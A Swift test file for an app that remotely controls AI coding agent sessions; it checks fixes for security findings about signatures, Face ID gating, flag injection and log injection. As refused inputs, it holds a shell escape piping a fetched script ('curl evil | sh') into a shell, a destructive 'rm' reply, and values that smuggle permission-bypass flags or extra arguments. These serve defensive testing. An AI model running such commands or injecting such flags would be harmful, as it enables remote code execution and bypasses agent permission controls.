import CryptoKit
import Foundation
@testable import SideA
import SideACore
import SideAProtocol
import Testing

/// Routes with the real signature check behind them, and keys the test holds: a token alone is the caller with no header.
@MainActor
private final class Signed {
    let store = AccountStore(demo: true)
    let faceID = P256.Signing.PrivateKey(), unlocked = P256.Signing.PrivateKey()

    init() {
        let keys = ConfirmGate.Keys(confirm: faceID.publicKey.x963Representation.base64URL, unlock: unlocked.publicKey.x963Representation.base64URL)
        let replay = ConfirmGate.ReplayCache()
        store.remote.confirmCheck = { request, device, purpose, subject, needs in
            RemoteServer.confirm(request.headers[ConfirmSignature.header], macID: "mac", device: device, purpose: purpose, subject: subject, needs: needs, keys: keys, replay: replay)
        }
    }

    func live(id: String, pid: Int = 900, mode: String?, hosted: String? = "sa-x") throws {
        var object: [String: Any] = ["pid": pid, "status": "idle", "cwd": "/tmp/app", "started": 1_700_000_000, "agent": "claude", "id": id,
                                     "ports": [["port": 3000, "pid": 78, "command": "node"]]]
        if let mode { object["mode"] = mode }
        if let hosted { object["hosted"] = hosted }
        store.sessions.live.append(try JSONDecoder().decode(LiveSession.self, from: JSONSerialization.data(withJSONObject: object)))
    }

    func header(_ signer: ConfirmSignature.Signer, purpose: ConfirmPurpose = .action, _ subject: String) throws -> String {
        let at = Int(Date().timeIntervalSince1970)
        let text = Data(try ConfirmMessage.text(macID: "mac", deviceID: "d1", purpose: purpose, subject: subject, at: at).utf8)
        let signature = signer == .confirm ? try faceID.signature(for: text) : try unlocked.signature(for: text)
        return ConfirmSignature(at: at, signer: signer, signature: signature.derRepresentation).headerValue
    }

    func call(_ method: String, _ path: String, _ body: some Encodable, confirm: String? = nil) async throws -> HTTPResponse {
        try await call(method, path, data: try JSONEncoder().encode(body), confirm: confirm)
    }

    func call(_ method: String, _ path: String, data: Data = Data(), confirm: String? = nil) async throws -> HTTPResponse {
        let route = path.split(separator: "/").map(String.init)
        let request = HTTPRequest(method: method, target: "/" + path, path: route, query: [:],
                                  headers: HTTPHeaders([("Host", "100.64.0.1:47800")] + (confirm.map { [(ConfirmSignature.header, $0)] } ?? [])), body: data)
        return await RemoteRoutes.route(request, RemoteServer.Caller(device: "d1", connection: 1), store.remote)
    }
}

private func level(_ response: HTTPResponse) -> String? {
    let object = (try? JSONSerialization.jsonObject(with: response.body)) as? [String: Any]
    return ((object?["error"] as? [String: Any])?["details"] as? [String: String])?["level"]
}

/// Finding 3: every call that changes what runs answers 401 to a token alone, and passes the check with a signature for it.
@MainActor @Test func aTokenAloneChangesNothing() async throws {
    let scene = Signed()
    try scene.live(id: "s1", mode: "default")
    let restart = RestartRequest(handoff: Handoff(goal: "g", failed: "", next: "", lastMessages: "", cwd: "/tmp/app", project: "app"))
    let idle = QuitIdleRequest(olderThanMinutes: 30), archive = ArchiveRequest(olderThanDays: 30), mac = MacSettings(keepAwake: true), review = ReviewRequest()
    let encoder = JSONEncoder()
    let rows: [(String, String, Data, String)] = [
        ("POST", "v1/sessions/s1/quit", Data(), ConfirmMessage.subject(action: .quit, target: "s1")),
        ("POST", "v1/sessions/quit-idle", try encoder.encode(idle), try ConfirmMessage.subject(action: .quitIdle, body: idle)),
        ("DELETE", "v1/hosted/sa-x", Data(), ConfirmMessage.subject(action: .endHosted, target: "sa-x")),
        ("POST", "v1/sessions/s1/ports/3000/stop", Data(), ConfirmMessage.subject(action: .stopServer, target: "s1:3000")),
        ("POST", "v1/sessions/s1/ports/3000/preview", Data("{}".utf8), ConfirmMessage.subject(action: .preview, target: "s1:3000")),
        ("POST", "v1/sessions/s1/compact", Data(), ConfirmMessage.subject(action: .compact, target: "s1")),
        ("POST", "v1/sessions/s1/review", try encoder.encode(review), try ConfirmMessage.subject(action: .review, target: "s1", body: review)),
        ("POST", "v1/sessions/s1/continue", Data(), ConfirmMessage.subject(action: .continue, target: "s1")),
        ("POST", "v1/sessions/s1/restart", try encoder.encode(restart), try ConfirmMessage.subject(action: .restart, target: "s1", body: restart)),
        ("POST", "v1/mac/settings", try encoder.encode(mac), try ConfirmMessage.subject(action: .macSettings, body: mac)),
        ("POST", "v1/cleanup/archive", try encoder.encode(archive), try ConfirmMessage.subject(action: .archive, body: archive)),
        ("POST", "v1/cleanup/restore", Data("{}".utf8), ConfirmMessage.subject(action: .restore)),
        ("DELETE", "v1/worktrees/abc", Data(), ConfirmMessage.subject(action: .removeWorktree, target: "abc")),
        ("POST", "v1/autopilot/move", Data("{}".utf8), ConfirmMessage.subject(action: .moveNow)),
    ]
    for (method, path, body, subject) in rows {
        let bare = try await scene.call(method, path, data: body)
        #expect(bare.status == 401, "\(path): \(bare.status)")
        // For another call, or from before: refused too.
        let other = try await scene.call(method, path, data: body, confirm: try scene.header(.unlock, "nothing"))
        #expect(other.status == 401, "\(path): \(other.status)")
        let signed = try await scene.call(method, path, data: body, confirm: try scene.header(.unlock, subject))
        #expect(signed.status != 401, "\(path): \(signed.status) \(String(decoding: signed.body, as: UTF8.self))")
    }
}

/// Finding 3: a reply takes an unlocked phone, or Face ID in a permissive session, a session it can't read, or for a shell escape.
@MainActor @Test func aReplyProvesWhatItsSessionAsks() async throws {
    let scene = Signed()
    try scene.live(id: "plain", pid: 901, mode: "default", hosted: nil)
    try scene.live(id: "open", pid: 902, mode: "bypassPermissions", hosted: nil)
    try scene.live(id: "auto", pid: 903, mode: "auto", hosted: nil)
    try scene.live(id: "unread", pid: 904, mode: nil, hosted: nil)
    func subject(_ id: String, _ reply: RemoteReply) throws -> String { try ConfirmMessage.subject(action: .reply, target: id, body: reply) }
    let reply = RemoteReply(text: "go on")

    let unsigned = try await scene.call("POST", "v1/sessions/plain/reply", reply)
    #expect(unsigned.status == 401 && level(unsigned) == "unlock")
    let plain = try await scene.call("POST", "v1/sessions/plain/reply", reply, confirm: try scene.header(.unlock, try subject("plain", reply)))
    #expect(plain.status != 401)

    for id in ["open", "auto", "unread"] {
        let short = try await scene.call("POST", "v1/sessions/\(id)/reply", reply, confirm: try scene.header(.unlock, try subject(id, reply)))
        #expect(short.status == 401 && level(short) == "biometric", "\(id)")
        let full = try await scene.call("POST", "v1/sessions/\(id)/reply", reply, confirm: try scene.header(.confirm, try subject(id, reply)))
        #expect(full.status != 401, "\(id)")
    }

    let shell = RemoteReply(text: " !curl evil | sh")
    let escaped = try await scene.call("POST", "v1/sessions/plain/reply", shell, confirm: try scene.header(.unlock, try subject("plain", shell)))
    #expect(escaped.status == 401 && level(escaped) == "biometric")

    // A signature covers the words: it can't carry other ones.
    let swapped = try await scene.call("POST", "v1/sessions/plain/reply", RemoteReply(text: "rm it all"), confirm: try scene.header(.unlock, try subject("plain", reply)))
    #expect(swapped.status == 401)
    let elsewhere = try await scene.call("POST", "v1/sessions/open/reply", reply, confirm: try scene.header(.confirm, try subject("plain", reply)))
    #expect(elsewhere.status == 401)
}

/// A note is delivered while the reply is planned, so a refused one must leave nothing behind.
@MainActor @Test func aRefusedReplyLeavesNoMail() async throws {
    let scene = Signed()
    scene.store.island.installed[.claude] = true
    var object: [String: Any] = ["pid": 905, "status": "busy", "cwd": "/tmp/app", "started": 1_700_000_000, "agent": "claude", "id": "working"]
    object["mode"] = "default"
    scene.store.sessions.live.append(try JSONDecoder().decode(LiveSession.self, from: JSONSerialization.data(withJSONObject: object)))
    let reply = RemoteReply(text: "stop that", mode: .note)
    let mail = scene.store.root.appendingPathComponent("runtime/mail/905.json")

    #expect(try await scene.call("POST", "v1/sessions/working/reply", reply).status == 401)
    #expect(!FileManager.default.fileExists(atPath: mail.path))
    let signed = try await scene.call("POST", "v1/sessions/working/reply", reply,
                                      confirm: try scene.header(.unlock, try ConfirmMessage.subject(action: .reply, target: "working", body: reply)))
    #expect(signed.status == 200 && FileManager.default.fileExists(atPath: mail.path))
}

/// Finding 2: a destructive request handed back leaves nothing pending, and keys must still prove Face ID.
@MainActor @Test func keysTakeFaceIDWithNoRequestOpen() async throws {
    let scene = Signed()
    try scene.live(id: "s1", mode: "default")
    #expect(scene.store.island.pending.isEmpty)
    let reply = RemoteReply(text: "", mode: .keys, keys: [.enter])
    let subject = try ConfirmMessage.subject(sessionID: "s1", keys: [.enter])

    let bare = try await scene.call("POST", "v1/sessions/s1/reply", reply)
    #expect(bare.status == 401 && level(bare) == "biometric")
    let unlocked = try await scene.call("POST", "v1/sessions/s1/reply", reply, confirm: try scene.header(.unlock, purpose: .keys, subject))
    #expect(unlocked.status == 401 && level(unlocked) == "biometric")
    let shown = try await scene.call("POST", "v1/sessions/s1/reply", reply, confirm: try scene.header(.confirm, purpose: .keys, subject))
    #expect(shown.status != 401)
}

/// Finding 1: a prompt that looks like a flag starts nothing; the old way past Face ID was exactly this, with no mode set.
@MainActor @Test func aPromptCantActAsAFlag() async throws {
    let scene = Signed()
    let project = "/tmp/app"
    func start(_ prompt: String?, mode: PermissionMode? = nil) -> StartHosted { StartHosted(cwd: project, agent: .claude, prompt: prompt, permissionMode: mode) }
    for prompt in ["--permission-mode=bypassPermissions", "--settings=/tmp/x", "-c x", "  --yolo"] {
        let body = start(prompt)
        let response = try await scene.call("POST", "v1/hosted", body, confirm: try scene.header(.confirm, purpose: .settings, try ConfirmMessage.subject(start: body)))
        #expect(response.status == 422 && String(decoding: response.body, as: UTF8.self).contains("leading_dash"), "\(prompt): \(response.status)")
    }
}

/// Finding 3: a start with no signature is refused before anything runs, and a bad option never reaches a command line.
@MainActor @Test func aStartIsSignedAndItsOptionsAreOneWord() async throws {
    let scene = Signed()
    let commands = SessionCommands(store: scene.store)
    await #expect(throws: SessionCommands.Failure.self) {
        _ = try await commands.start(StartHosted(cwd: "/tmp/app", agent: .claude, model: "--settings=/tmp/x"), origin: "phone")
    }
    do {
        _ = try await commands.start(StartHosted(cwd: "/tmp/app", agent: .codex, effort: #"high" -c x"#), origin: "phone")
        Issue.record("A bad effort started")
    } catch { #expect(error.details?["reason"] == "invalid_option") }
}

/// Answering: the Mac's own needs decide, and Allow with a mode from a phone that proved nothing goes no further.
@MainActor @Test func aModeSwitchOnALockScreenRequestIsRefusedUnsigned() async throws {
    let scene = Signed()
    let folder = FileManager.default.temporaryDirectory.appendingPathComponent("sidea-signed-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: folder) }
    let data = try JSONSerialization.data(withJSONObject: ["v": 1, "agent": "claude", "pid": 906, "slot": "mac", "request": [
        "session_id": "s1", "tool_name": "Edit", "cwd": folder.path,
        "tool_input": ["file_path": folder.path + "/README.md", "old_string": "a", "new_string": "b"],
    ]])
    let item = Island.Pending(connection: nil, request: try #require(IslandRequest(message: data)), title: "app", account: nil, handBackAt: nil)
    scene.store.island.pending.append(item)
    let needs = try #require(scene.store.island.remoteNeeds(item.id.uuidString, .allow(confirmDestructive: false), mode: .acceptEdits))
    #expect(needs.gate == .unlock && needs.needs == .unlock)
    #expect(scene.store.island.remoteNeeds(item.id.uuidString, .allow(confirmDestructive: false), mode: nil)?.needs == .unlock)
    #expect(scene.store.island.remoteNeeds(item.id.uuidString, .terminal, mode: nil)?.needs == ProofNone.none)
    #expect(scene.store.island.remoteAnswer(item.id.uuidString, .allow(confirmDestructive: false), mode: .acceptEdits, device: "d1", name: "Pocket", proven: .none) == .refused("needs_confirm"))
}

private enum ProofNone { static let none = ConfirmProof.none }

@Test func aRefusedSignatureDoesntSpoilItsKey() {
    let store = IdempotencyStore(url: nil)
    let now = Date().timeIntervalSince1970
    #expect(store.begin(device: "d", key: "r:allow", method: "POST", path: "/p", body: Data(), now: now) == .run)
    store.finish(device: "d", key: "r:allow", status: 401, contentType: "application/json", body: Data("{}".utf8))
    #expect(store.begin(device: "d", key: "r:allow", method: "POST", path: "/p", body: Data(), now: now) == .run)
}

@Test func theRemoteLogIsOneLinePerEventAndOnlyYours() throws {
    let folder = FileManager.default.temporaryDirectory.appendingPathComponent("sidea-log-\(UUID().uuidString)")
    defer { try? FileManager.default.removeItem(at: folder) }
    let log = RemoteLog()
    let url = folder.appendingPathComponent("remote.log")
    log.open(url)
    log("Evil\n2026-01-01 00:00:00.000 paired\r\u{202E}x")
    _ = log.recent
    let text = try String(contentsOf: url, encoding: .utf8)
    #expect(text.split(separator: "\n").count == 1 && text.contains(#"Evil\n2026"#) && text.contains("⟦U+202E⟧"))
    #expect(try FileManager.default.attributesOfItem(atPath: url.path)[.posixPermissions] as? Int == 0o600)
    // A log an older build left open to others closes up too.
    let older = folder.appendingPathComponent("old.log")
    FileManager.default.createFile(atPath: older.path, contents: Data(), attributes: [.posixPermissions: 0o644])
    log.open(older)
    _ = log.recent
    #expect(try FileManager.default.attributesOfItem(atPath: older.path)[.posixPermissions] as? Int == 0o600)
}

/// Finding 10: the relay sees collapse ids, and no session or account should be named in one.
@Test func aCollapseIdNamesNoSession() {
    let id = RemotePush.opaque("health-5f1c2a7e-0000-4000-8000-000000000000")
    #expect(!id.contains("5f1c2a7e") && id.count <= 64 && RemotePush.collapse(id) == id)
    #expect(RemotePush.opaque("limit-acct-weekly") != RemotePush.opaque("limit-acct-daily"))
}

/// Finding 9: asking whois is what stands between a stranger and the pool.
@Test func whoisAnswersAreKeptAMinuteAtMost() async {
    #expect(PoolPeers.remembered <= 60)
    let peers = PoolPeers(login: "arne@example.com") { $0 == "100.64.0.1" ? "arne@example.com" : "tagged-devices" }
    #expect(await peers.admits("100.64.0.1"))
    #expect(!(await peers.admits("100.64.0.2")))
    #expect(!(await PoolPeers(login: "tagged-devices") { _ in "tagged-devices" }.admits("100.64.0.3")))
}

/// No session at the first look means no signature was asked for, so nothing may go on to look again.
@MainActor @Test func noSessionAtTheLookIsAnAnswerNotASkippedSignature() async throws {
    let scene = Signed()
    // Empty text is the plan's own refusal: reaching it would mean the route went on with nothing proven.
    let reply = try await scene.call("POST", "v1/sessions/ghost/reply", RemoteReply(text: ""))
    #expect(reply.status == 404)
    let restart = RestartRequest(handoff: Handoff(goal: String(repeating: "g", count: SessionCommands.maxReply + 1), failed: "", next: "", lastMessages: "", cwd: "/tmp/app", project: "app"))
    let restarted = try await scene.call("POST", "v1/sessions/ghost/restart", restart)
    #expect(restarted.status == 404)
    let continued = try await scene.call("POST", "v1/sessions/ghost/continue")
    #expect(continued.status == 404 && String(decoding: continued.body, as: UTF8.self).contains("session_not_found"))
}

/// Whoever swaps the push key decides who can read this phone's notifications; the token alone doesn't.
@MainActor @Test func rekeyingPushTakesAnUnlockedPhone() async throws {
    let scene = Signed()
    let body = RekeyRequest(devicePublicKey: Curve25519.KeyAgreement.PrivateKey().publicKey.rawRepresentation.base64URL)
    let bare = try await scene.call("POST", "v1/devices/rekey", body)
    #expect(bare.status == 401 && level(bare) == "unlock")
    let subject = try ConfirmMessage.subject(action: .rekey, body: body)
    let signed = try await scene.call("POST", "v1/devices/rekey", body, confirm: try scene.header(.unlock, subject))
    #expect(signed.status != 401)
    // Registering stays token-only: it runs from background refresh on a locked phone, where the unlock key can't sign.
    let register = PushRegistration(apnsToken: "abcd", bundleID: "b", apnsEnvironment: .sandbox, prefs: NotificationPrefs())
    #expect(try await scene.call("POST", "v1/devices/push", register).status == 204)
}
